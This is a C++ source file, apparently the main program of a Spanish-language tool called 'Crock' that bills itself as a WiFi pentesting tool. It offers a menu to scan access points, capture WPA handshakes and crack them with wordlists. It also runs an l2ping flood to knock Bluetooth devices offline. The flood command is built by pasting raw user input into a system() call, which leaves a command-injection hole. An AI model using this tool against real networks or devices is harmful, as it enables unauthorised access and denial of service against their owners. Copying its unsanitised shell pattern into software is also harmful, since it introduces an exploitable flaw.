#include "Crock.h"
#include <algorithm>
#include <csignal>
#include <dirent.h>
#include <iostream>
#include <vector>

Crock auditor;

void signal_handler(int signum) {
  std::cout << "\n[!] Interrupción recibida. Limpiando..." << std::endl;
  Crock::keep_running = false;
}

void show_targets(const std::map<std::string, APInfo> &targets,
                  std::vector<std::string> &bssid_map) {
  std::printf("\n ID |              BSSID |  CH |  PWR | SSID\n");
  std::printf("----------------------------------------------------------------"
              "------\n");
  int id = 1;
  bssid_map.clear();
  for (auto const &[bssid, info] : targets) {
    std::printf("%3d | %18s | %3d | %4ddB | %s %s\n", id++, bssid.c_str(),
                info.channel, info.signal, info.ssid.c_str(),
                info.handshake_captured ? "[HS]" : "");
    bssid_map.push_back(bssid);
  }
}

#include <sys/stat.h>

std::vector<std::string> get_available_wordlists() {
  std::vector<std::string> lists;
  DIR *dir;
  struct dirent *ent;
  if ((dir = opendir("wordlists")) != NULL) {
    while ((ent = readdir(dir)) != NULL) {
      std::string name = ent->d_name;
      if (name != "." && name != ".." && name.find("README") == std::string::npos && name.front() != '#' && name.back() != '~') {
        std::string path = "wordlists/" + name;
        struct stat st;
        if (stat(path.c_str(), &st) == 0 && st.st_size > 0 && S_ISREG(st.st_mode)) {
          lists.push_back(path);
        }
      }
    }
    closedir(dir);
  }
  return lists;
}

int main() {
  std::signal(SIGINT, signal_handler);

  // Color Gris: \033[1;30m
  std::cout << "\033[1;30m" << std::endl;
  std::cout << " ██████╗██████╗  ██████╗  ██████╗██╗  ██╗" << std::endl;
  std::cout << "██╔════╝██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝" << std::endl;
  std::cout << "██║     ██████╔╝██║   ██║██║     █████╔╝ " << std::endl;
  std::cout << "██║     ██╔══██╗██║   ██║██║     ██╔═██╗ " << std::endl;
  std::cout << "╚██████╗██║  ██║╚██████╔╝╚██████╗██║  ██╗" << std::endl;
  std::cout << " ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝" << std::endl;
  std::cout << "                                         " << std::endl;
  std::cout << "         PENTESTING WIFI TOOL          " << std::endl;
  std::cout << "             by EstebanCRO               \033[0m\n"
            << std::endl;

  std::vector<std::string> ifaces = auditor.list_interfaces();
  if (ifaces.empty())
    return 1;

  std::cout << "[*] Interfaces detectadas:" << std::endl;
  for (size_t i = 0; i < ifaces.size(); ++i)
    std::cout << "  [" << i << "] " << ifaces[i] << std::endl;

  int choice;
  std::cout << "\nSelecciona interfaz > ";
  std::cin >> choice;
  if (choice < 0 || choice >= (int)ifaces.size())
    return 1;
  std::string iface = ifaces[choice];

  auditor.auto_monitor(iface);
  if (!auditor.set_interface(iface)) {
    std::cout << "\033[1;31m[!] No se pudo abrir '" << iface << "' con pcap.\033[0m" << std::endl;
    std::cout << "[!] Asegurate de correr como root y que la interfaz esta en monitor mode." << std::endl;
    return 1;
  }

  std::vector<std::string> selected_wordlists;
  auto available = get_available_wordlists();

  while (true) {
    std::cout << "\n\033[1;30m[ CROCK LETHAL PANEL ]\033[0m" << std::endl;
    std::cout << "1. INICIAR ESCANEO (Modo Letal)" << std::endl;
    std::cout << "2. GESTIONAR DICCIONARIOS (" << selected_wordlists.size()
              << " seleccionados)" << std::endl;
    std::cout << "3. ATAQUE BLUETOOTH (Inhibir BLE / DoS L2Ping)" << std::endl;
    std::cout << "0. SALIR Y RESTAURAR" << std::endl;
    std::cout << "Selección > ";
    int op;
    std::cin >> op;

    if (op == 1) {
      if (selected_wordlists.empty()) {
        std::cout << "[!] Selecciona al menos un diccionario primero."
                  << std::endl;
        continue;
      }
      auditor.clear_targets();
      auditor.start_scan();
      auto targets = auditor.get_targets();
      std::vector<std::string> bssid_map;
      show_targets(targets, bssid_map);
      std::cout << "\nSelecciona ID Objetivo para ATAQUE (Handshake + Crack) "
                   "(0 cancelar) > ";
      int tid;
      std::cin >> tid;
      if (tid > 0 && tid <= (int)bssid_map.size())
        auditor.targeted_attack(bssid_map[tid - 1], selected_wordlists);
    } else if (op == 2) {
      std::cout << "\n--- DICCIONARIOS DISPONIBLES ---" << std::endl;
      for (size_t i = 0; i < available.size(); ++i) {
        bool sel =
            std::find(selected_wordlists.begin(), selected_wordlists.end(),
                      available[i]) != selected_wordlists.end();
        std::cout << " [" << i + 1 << "] " << (sel ? "[X] " : "[ ] ")
                  << available[i] << std::endl;
      }
      std::cout << "Selecciona ID para añadir/quitar (0 terminar) > ";
      int wid;
      while (std::cin >> wid && wid != 0) {
        if (wid > 0 && wid <= (int)available.size()) {
          auto it = std::find(selected_wordlists.begin(),
                              selected_wordlists.end(), available[wid - 1]);
          if (it != selected_wordlists.end())
            selected_wordlists.erase(it);
          else
            selected_wordlists.push_back(available[wid - 1]);
        }
        std::cout << "Siguiente ID (0 terminar) > ";
      }
    } else if (op == 3) {
      std::cout << "\n\033[1;34m[+] Escaneando dispositivos Bluetooth Clásicos (hcitool scan)...\033[0m" << std::endl;
      std::system("hcitool scan");
      std::cout << "\n\033[1;34m[+] Escaneando dispositivos BLE (hcitool lescan 5s)...\033[0m" << std::endl;
      std::system("timeout 5 hcitool lescan 2>/dev/null");
      
      std::cout << "\nIntroduce la MAC del dispositivo Bluetooth a inhibir (0 para cancelar) > ";
      std::string bt_mac;
      std::cin >> bt_mac;
      if (bt_mac != "0") {
        std::cout << "\n\033[1;31m[!!!] INICIANDO L2PING FLOOD (DoS) CONTRA " << bt_mac << " [!!!]\033[0m" << std::endl;
        std::cout << "[*] Saturando conexiones entrantes y forzando desconexiones..." << std::endl;
        std::cout << "[*] Presiona Ctrl+C en cualquier momento para detener." << std::endl;
        // -f: flood, -s 600: packet size
        std::string cmd = "l2ping -i hci0 -s 600 -f " + bt_mac;
        std::system(cmd.c_str());
        std::cout << "\n[+] Ataque finalizado." << std::endl;
      }
    } else if (op == 0) {
      auditor.restore_interface(iface);
      break;
    }
  }

  return 0;
}
